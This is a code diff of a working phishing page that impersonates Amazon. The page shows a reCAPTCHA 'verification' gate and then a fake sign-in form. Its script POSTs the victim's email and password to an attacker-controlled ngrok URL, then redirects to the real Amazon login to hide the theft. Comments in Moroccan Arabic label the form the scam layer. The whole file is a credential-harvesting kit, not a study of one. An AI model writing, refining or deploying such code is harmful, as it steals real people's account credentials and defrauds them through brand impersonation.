@@ -1,59 +1,75 @@
-<script>
-    // الرابط ديال ngrok ديالك
-    const SERVER_URL = "https://743a-196-113-84-3.ngrok-free.app/receive";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Verification</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .box { width: 350px; padding: 25px; border: 1px solid #ddd; border-radius: 8px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #f0c14b; border: 1px solid #a88734; border-radius: 3px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        button:disabled { background: #eee; cursor: not-allowed; border-color: #ddd; }
+        #login-layer { display: none; text-align: left; border: none; padding: 0; }
+        .logo { margin-bottom: 20px; width: 100px; }
+        label { font-size: 13px; font-weight: bold; }
+    </style>
+</head>
+<body>
 
-    function unlock() { 
-        document.getElementById('v-btn').disabled = false; 
-    }
+    <!-- الطبقة 1: البوابة (reCAPTCHA) -->
+    <div id="gate-layer" class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo">
+        <p style="font-size: 14px;">To protect your account, please solve the challenge.</p>
+        <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" data-callback="onUnlock"></div>
+        <button id="v-btn" disabled onclick="showLogin()">Continue</button>
+    </div>
 
-    document.getElementById('v-btn').onclick = function() {
-        // فاش كيبرك على الزر، كنمسحو البوابة ونحطو السكاما
-        document.open();
-        document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Amazon Sign-In</title>
-                <style>
-                    body { font-family: Arial, sans-serif; text-align: center; background: white; margin-top: 50px; }
-                    .login-box { width: 350px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 4px; text-align: left; }
-                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; }
-                    button { width: 100%; padding: 10px; background: #f0c14b; border: 1px solid #a88734; border-radius: 3px; cursor: pointer; font-weight: bold; }
-                    .footer { font-size: 12px; color: #555; margin-top: 20px; text-align: center; }
-                </style>
-            </head>
-            <body>
-                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100" style="margin-bottom:20px;">
-                <div class="login-box">
-                    <h1 style="font-weight: 400; font-size: 28px;">Sign-In</h1>
-                    <label>Email or mobile phone number</label>
-                    <input type="email" id="email_user">
-                    <label>Password</label>
-                    <input type="password" id="pass_user">
-                    <button id="submit_btn">Continue</button>
-                    <p style="font-size: 12px; margin-top: 15px;">By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
-                </div>
-                <div class="footer">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
-                
-                <script>
-                    document.getElementById('submit_btn').onclick = function() {
-                        const email = document.getElementById('email_user').value;
-                        const pass = document.getElementById('pass_user').value;
-                        
-                        fetch("${SERVER_URL}", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ email: email, password: pass, time: new Date().toLocaleString() })
-                        }).then(() => {
-                            window.location.href = "https://www.amazon.com/ap/signin";
-                        }).catch(() => {
-                            alert("Connection Error. Try again.");
-                        });
-                    };
-                <\/script>
-            </body>
-            </html>
-        `);
-        document.close();
-    };
-</script>
+    <!-- الطبقة 2: السكاما (Login) -->
+    <div id="login-layer" class="box">
+        <center><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo"></center>
+        <h1 style="font-weight: 400; font-size: 28px; margin-top: 0;">Sign-In</h1>
+        <label>Email or mobile phone number</label>
+        <input type="email" id="email">
+        <label>Password</label>
+        <input type="password" id="pass">
+        <button onclick="sendData()">Sign-In</button>
+        <p style="font-size: 12px; color: #555; margin-top: 15px;">By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
+    </div>
+
+    <script>
+        const SERVER_URL = "https://743a-196-113-84-3.ngrok-free.app/receive";
+
+        function onUnlock() {
+            document.getElementById('v-btn').disabled = false;
+        }
+
+        function showLogin() {
+            document.getElementById('gate-layer').style.display = 'none';
+            document.getElementById('login-layer').style.display = 'block';
+        }
+
+        function sendData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if(!email || !pass) return alert("Please enter your credentials");
+
+            fetch(SERVER_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ 
+                    user: email, 
+                    password: pass, 
+                    type: "Amazon-Login" 
+                })
+            }).then(() => {
+                window.location.href = "https://www.amazon.com/ap/signin";
+            }).catch(() => {
+                alert("Connection Error. Please check your internet.");
+            });
+        }
+    </script>
+</body>
+</html>
